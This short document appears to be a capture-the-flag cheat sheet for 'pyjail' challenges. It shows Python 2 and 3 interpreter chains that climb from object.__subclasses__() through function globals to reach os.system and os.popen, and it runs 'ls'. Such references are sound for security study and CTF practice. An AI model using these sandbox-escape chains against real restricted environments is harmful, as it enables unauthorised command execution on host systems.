## pyjail cheatsheat

### os

```
>>> ().__class__.__base__.__subclasses__()[49]
<class 'warnings.catch_warnings'>
>>> ().__class__.__base__.__subclasses__()[49].__init__
<unbound method catch_warnings.__init__>
>>> ().__class__.__base__.__subclasses__()[49].__init__.func_globals
{'filterwarnings': <function filterwarnings at 0x7f4da4c87a28>, ..., 'linecache': <module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>, ..., '_getaction': <function _getaction at 0x7f4da4c87cf8>}
>>> ().__class__.__base__.__subclasses__()[49].__init__.func_globals["linecache"]
<module 'linecache' from '/usr/lib/python2.7/linecache.pyc'>
>>> ().__class__.__base__.__subclasses__()[49].__init__.func_globals["linecache"].__dict__
{'updatecache': <function updatecache at 0x7f4da4c878c0>, ..., 'os': <module 'os' from '/usr/lib/python2.7/os.pyc'>, ...}
>>> ().__class__.__base__.__subclasses__()[49].__init__.func_globals["linecache"].__dict__["os"]
<module 'os' from '/usr/lib/python2.7/os.pyc'>
>>> ().__class__.__base__.__subclasses__()[49].__init__.func_globals["linecache"].__dict__["os"].system
<built-in function system>
```

```
>>> ().__class__.__base__.__subclasses__()[504].__init__.__globals__['sys'].version
3.5.2 (default, Nov 23 2017, 16:37:01) [GCC 5.4.0 20160609]
>>> ().__class__.__base__.__subclasses__()[504].__init__.__globals__['sys'].modules['os'].popen('ls').read()
```

- indices can be different
